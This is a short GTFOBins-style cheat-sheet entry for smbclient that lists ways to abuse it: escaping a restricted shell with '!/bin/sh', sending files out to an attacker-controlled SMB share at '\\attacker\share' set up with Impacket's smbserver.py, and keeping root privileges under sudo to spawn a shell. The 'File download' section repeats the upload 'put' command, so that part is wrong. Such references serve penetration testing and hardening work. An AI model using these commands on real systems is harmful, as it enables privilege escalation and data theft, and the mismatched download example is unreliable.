# GTFOBin: smbclient

A valid SMB/CIFS server must be available.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
smbclient '\\attacker\share'
!/bin/sh
```

## File upload

It can exfiltrate files on the network.

Install Impacket and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.

```
smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
```

## File download

It can download remote files.

Install Impacket and run `sudo smbserver.py share /tmp` on the attacker box to send the file.

```
smbclient '\\attacker\share' -c 'put file_to_send where_to_save'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo smbclient '\\attacker\share'
!/bin/sh
```